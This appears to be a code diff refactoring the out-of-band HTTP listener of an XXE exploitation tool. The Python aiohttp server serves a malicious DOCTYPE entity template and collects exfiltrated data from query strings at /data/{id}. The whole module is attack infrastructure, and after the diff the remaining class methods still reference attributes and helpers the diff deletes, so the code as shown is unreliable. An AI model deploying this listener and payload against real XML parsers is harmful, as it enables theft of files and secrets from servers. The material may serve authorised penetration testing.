@@ -1,109 +1,83 @@
 import asyncio
-import functools
 import random
+from typing import Tuple
 from urllib import parse
 
 from aiohttp import web
 
-ENTITY_INJECTION_TEMPLATE = "<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies {0}>]> <data>&goodies;</data>"
+ENTITY_INJECTION_TEMPLATE = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' \
+                            '<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies {0}>]> <data>&goodies;</data>'
+
+router = web.RouteTableDef()
 
 
-def _wrapper(func):
-    """
-    Wrap an aiohttp view function so it can just return a string or integer
-    """
-    @functools.wraps(func)
-    def _inner(*args, **kwargs):
-        res = func(*args, **kwargs)
+@router.get('/test/data')
+async def test_handler(request: web.Request):
+    return web.Response(body=f"<data>{request.app['test_response_value']}</data>", content_type='text/xml')
 
-        if isinstance(res, str):
-            return web.Response(text=res, content_type='text/xml')
-        elif isinstance(res, int):
-            return web.Response(status=res)
-        else:
-            raise RuntimeError('Unhandled response: {res}'.format(res=res))
 
-    return _inner
+@router.get('/test/entity')
+async def test_entity_handler(request: web.Request):
+    return web.Response(body=ENTITY_INJECTION_TEMPLATE.format(f'"{request.app["test_response_value"]}"'),
+                        content_type='text/xml')
 
+
+@router.get('/entity/{id}')
+async def entity_handler(request: web.Request):
+    file_id = request.match_info["id"]
+    if file_id not in request.app['expectations']:
+        return web.Response(status=404)
+
+    value = request.app['entity_values'][file_id]
+    return web.Response(body=ENTITY_INJECTION_TEMPLATE.format(value), content_type='text/xml')
+
+
+@router.get('/data/{id}')
+async def data_handler(request: web.Request):
+    expect_id = request.match_info['id']
+    if expect_id not in request.app['expectations']:
+        return web.Response(status=404)
+
+    data = parse.unquote(request.rel_url.query_string[2:])
+    request.app['expectations'][expect_id].set_result(data)
+    del request.app['expectations'][expect_id]
+    if expect_id in request.app['entity_values']:
+        del request.app['entity_values'][expect_id]
+    return web.Response(body=f"<data>{request.app['test_response_value']}</data>", content_type='text/xml')
+
+
+def create_app():
+    app = web.Application(client_max_size=1024*1024*1024*102)
+    app.router.add_routes(router)
+    app['test_response_value'] = random.randint(1, 1000000)
+    app['expectations'] = {}
+    app['entity_values'] = {}
+    app['counter'] = 0
+    return app
+
+
+def expect_data(app: web.Application) -> Tuple[str, asyncio.Future]:
+    expectations = app['expectations']
+    app['counter'] += 1
+    identifier = str(app['counter'])
+    future = asyncio.Future()
+    expectations[identifier] = future
+    return identifier, future
+
+
+def expect_entity_injection(app: web.Application, entity_value):
+    identifier, future = expect_data(app)
+    app['entity_values'][identifier] = entity_value
+    return identifier, future
 
 
 class OOBHttpServer:
     test_data_url = "/test/data"
     test_entity_url = "/test/entity"
 
-    def __init__(self, external_ip, port):
-        self.port = port
-        self.external_ip = external_ip
-
-        self.expectations = {}  #: Dict[str, asyncio.Future]
-        self.entity_files = {}
-        self.file_data = {}
-
-        self.test_response_value = random.randint(1, 1000000)
-
-        self._tick = 0
-        self._server = None
-
-        self.app = self.create_app()
-
     @property
     def location(self):
         return 'http://{self.external_ip}:{self.port}'.format(self=self)
-
-    def create_app(self):
-        app = web.Application()
-        app.router.add_route("GET", self.test_data_url, _wrapper(self.test_handler))
-        app.router.add_route("GET", self.test_entity_url, _wrapper(self.test_entity_handler))
-        app.router.add_route("GET", "/entity/{id}", _wrapper(self.entity_handler))
-        app.router.add_route("GET", "/data/{id}", _wrapper(self.data_handler))
-        app.router.add_route("GET", "/download/{id}", _wrapper(self.download_handler))
-        return app
-
-    def test_handler(self, request: web.Request):
-        return "<data>{self.test_response_value}</data>".format(self=self)
-
-    def test_entity_handler(self, request: web.Request):
-        return ENTITY_INJECTION_TEMPLATE.format('"{self.test_response_value}"'.format(self=self))
-
-    def entity_handler(self, request: web.Request):
-        file_id = request.match_info["id"]
-        if not self.expecting_identifier(file_id):
-            return 404
-
-        value = self.entity_files[file_id]
-        return ENTITY_INJECTION_TEMPLATE.format(value)
-
-    def data_handler(self, request: web.Request):
-        expect_id = request.match_info['id']
-
-        if not self.expecting_identifier(expect_id):
-            return 404
-
-        data = parse.unquote(request.rel_url.query_string[2:])
-
-        self.got_data(expect_id, data)
-        return "<data>{self.test_response_value}</data>".format(self=self)
-
-    def download_handler(self, request: web.Request):
-        expect_id = request.match_info['id']
-
-        if not self.expecting_identifier(expect_id):
-            print('Not expecting ID {expect_id}'.format(expect_id=expect_id))
-            return 404
-
-        self.got_data(expect_id, True)
-        return "<data>{d}</data>".format(d=self.file_data[expect_id])
-
-    def got_data(self, expect_id, data):
-        self.expectations[expect_id].set_result(data)
-        del self.expectations[expect_id]
-
-    def expecting_identifier(self, id):
-        return id in self.expectations
-
-    def get_identifier(self):
-        self._tick += 1
-        return str(self._tick)
 
     def _expect(self):
         identifier, future = self.get_identifier(), asyncio.Future()
@@ -123,19 +97,3 @@ class OOBHttpServer:
         identifier, future = self._expect()
         self.file_data[identifier] = file_data
         return '{self.location}/download/{identifier}'.format(self=self, identifier=identifier), future
-
-    async def start(self):
-        loop = asyncio.get_event_loop()
-        self._server = await loop.create_server(
-            self.app.make_handler(),
-            '0.0.0.0',
-            self.port
-        )
-
-        if not self.port:
-            self.port = self._server.sockets[0].getsockname()[1]
-
-    async def stop(self):
-        print('Stopping')
-        self._server.close()
-        await self._server.wait_closed()
